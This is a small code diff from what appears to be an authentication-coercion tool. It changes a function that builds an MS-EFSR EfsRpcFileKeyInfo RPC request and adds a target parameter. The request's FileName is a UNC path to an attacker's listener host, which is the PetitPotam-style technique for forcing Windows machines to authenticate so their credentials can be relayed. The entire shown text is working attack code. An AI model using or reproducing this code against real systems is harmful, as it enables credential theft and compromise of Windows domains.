@@ -18,7 +18,7 @@ class EfsRpcFileKeyInfoResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcFileKeyInfo()
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
     request["InfoClass"] = 0
